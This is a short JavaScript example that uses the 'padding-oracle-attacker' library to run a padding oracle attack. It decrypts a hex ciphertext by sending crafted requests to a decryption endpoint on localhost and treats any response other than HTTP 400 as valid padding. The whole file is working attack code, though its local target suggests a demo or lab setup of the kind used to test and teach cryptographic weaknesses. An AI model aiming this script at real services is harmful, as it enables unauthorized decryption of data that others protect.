import { decrypt } from 'padding-oracle-attacker'

const cipherHex = 'e3e70d8599206647dbc96952aaa209d75b4e3c494842aa1aa8931f51505df2a8a184e99501914312e2c50320835404e9'
const ciphertext = Buffer.from(cipherHex, 'hex')

// optional: already known plaintext bytes (from the end)
const alreadyFound = Buffer.from('04040404', 'hex')

decrypt({
  url: 'http://localhost:2020/decrypt?ciphertext=',
  blockSize: 16,
  ciphertext,
  alreadyFound,
  isDecryptionSuccess: ({ statusCode }) => statusCode !== 400
}).catch(console.error)
